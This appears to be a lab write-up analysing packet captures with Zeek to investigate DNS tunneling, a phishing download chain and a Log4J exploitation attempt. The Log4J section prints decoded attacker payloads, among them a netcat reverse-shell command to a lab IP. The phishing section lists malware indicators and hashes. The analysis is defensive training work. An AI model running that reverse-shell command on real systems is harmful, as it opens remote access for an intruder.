

## Task 2: Anomalous DNS

**Objective**: Investigate `dns-tunneling.pcap` to confirm "Anomalous DNS Activity" by analyzing `dns.log` and `conn.log` for DNS records, connection duration, unique queries, and source host.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/anomalous-dns/`

**Steps** :
1. Navigated to the task directory:
   ```bash
   cd /home/ubuntu/Desktop/Exercise-Files/anomalous-dns/
   ls
   ```
   - Files: `dns-tunneling.pcap`, etc.

2. **Processed PCAP**:
   - Ran Zeek to generate logs (no specific script provided, so used default Zeek processing):
     ```bash
     zeek -Cr dns-tunneling.pcap
     ```
   - Generated logs: `dns.log`, `conn.log`, etc.

3. **Number of DNS records linked to IPv6 (AAAA)**:
   - Counted AAAA records in `dns.log`:
     ```bash
     cat dns.log | grep 'AAAA' | wc -l
     ```
     - Result: **320 records** .

4. **Longest connection duration**:
   - Extracted duration from `conn.log`:
     ```bash
     cat conn.log | zeek-cut service duration | sort -n
     ```
   - Identified longest duration: **9.420791 seconds** .

5. **Number of unique DNS queries**:
   - Extracted unique queries:
     ```bash
     cat dns.log | zeek-cut query | sort -n | uniq
     ```
   - Observed numerous `cisco-update.com` subdomains, then filtered non-Cisco:
     ```bash
     cat dns.log | zeek-cut query | sort -n | uniq | grep -v 'cisco'
     ```
   - Non-Cisco domains: 5 (e.g., `connectivity-check.ubuntu.com`, `0.f.2.5.6.b.e.f.f.f.b.7.2.4.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8.e.f.ip6.arpa`).
   - Cisco subdomains: 1 unique .
   - Total unique queries: **6** .
   
6. **Source host IP**:
   - Inspected `conn.log`:
     ```bash
     cat conn.log | less
     ```
   - Identified source IP for DNS queries: **10.20.57.3** (to `10.10.2.22:53`) .



**Insights**:
- **Zeek Processing**: `zeek -Cr dns-tunneling.pcap` generates logs without requiring a script for basic analysis .
- **DNS Tunneling**: High-volume `cisco-update.com` subdomains indicate data exfiltration via DNS .
- **Zeek-Cut**: `zeek-cut query | sort -n | uniq` isolates unique domains .

---

## Task 3: Phishing

**Objective**: Investigate `phishing.pcap` to confirm a "Phishing Attempt" by analyzing logs for suspicious IPs, domains, and malicious files.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/phishing/`

**Steps** :
1. Navigated to the task directory:
   ```bash
   cd /home/ubuntu/Desktop/Exercise-Files/phishing/
   ls
   ```
   - Files: `phishing.pcap`, `hash-demo.zeek`, etc.

2. **Processed PCAP**:
   - Ran Zeek with `hash-demo.zeek` to extract file hashes:
     ```bash
     zeek -Cr phishing.pcap hash-demo.zeek
     ```
   - Generated logs: `conn.log`, `http.log`, `files.log`, etc.

3. **Suspicious source address**:
   - Inspected `conn.log`:
     ```bash
     cat conn.log | less
     ```
   - Identified suspicious source IP: **10[.]6[.]27[.]102** .

4. **Domain for malicious files**:
   - Analyzed `http.log`:
     ```bash
     cat http.log | less
     cat http.log | zeek-cut host uri status_msg info_msg orig_filenames orig_mime_types referrer
     ```
   - Found downloads from: **smart-fax[.]com** .

5. **File type of malicious document**:
   - Checked `files.log`:
     ```bash
     cat files.log | zeek-cut mime_type md5
     ```
   - MD5 `b5243ec1df7d1d5304189e7db2744128` (`application/msword`).
   - VirusTotal: **VBA** (macro-enabled Word document) .

6. **File name of malicious .exe**:
   - MD5 `cc28e40b46237ab6d5282199ef78c464` (`application/x-dosexec`).
   - VirusTotal: **PleaseWaitWindow.exe** .

7. **Contacted domain name**:
   - VirusTotal behavior for .exe: **hopto[.]org** .

8. **Request name of malicious .exe**:
   - From `http.log`, URI `/knr.exe`: **knr.exe** .

**Insights**:
- **Zeek Script**: `hash-demo.zeek` extracts MD5 hashes for VirusTotal .
- **Phishing Flow**: `10.6.27.102` downloaded `Invoice&MSO-Request.doc` (VBA), which ran `knr.exe`, contacting `hopto.org` .
- **Log Analysis**: `http.log` and `files.log` pinpoint malicious downloads .

---

## Task 4: Log4J 

**Objective**: Investigate `log4shell.pcap` with `detection-log4j.zeek` to confirm a "Log4J Exploitation Attempt."

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/log4j/`

**Steps** (from previous response):
1. Navigated to the task directory:
   ```bash
   cd /home/ubuntu/Desktop/Exercise-Files/log4j/
   ls
   ```
   - Files: `log4shell.pcap`, `detection-log4j.zeek`.

2. **Number of signature hits**:
   - Ran Zeek:
     ```bash
     zeek -Cr log4shell.pcap detection-log4j.zeek
     ```
   - Checked `signatures.log`:
     ```bash
     cat signatures.log | zeek-cut event_msg
     ```
   - Result: **3 events** .

3. **Tool used for scanning**:
   - Inspected `http.log`:
     ```bash
     cat http.log | less
     ```
   - User-agent: **Nmap** .

4. **Extension of exploit file**:
   - `http.log` URIs (e.g., `/ExploitQ8v7ygBW4i.class`): **.class** .

5. **Name of created file**:
   - Decoded Base64 in `log4j.log` (via CyberChef):
     - `dG91Y2ggL3RtcC9wd25lZAo=`: `touch /tmp/pwned`
     - `d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==`: `which nc > /tmp/pwned`
     - `bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==`: `nc 192.168.56.102 80 -e /bin/sh -vvv`
   - Created file: **pwned** .

**Insights**:
- **Log4J Exploit**: JNDI lookups deliver `.class` files, executing commands like `touch /tmp/pwned` .
- **Nmap**: Probes Log4J vulnerabilities (CVE-2021-44228) .

---

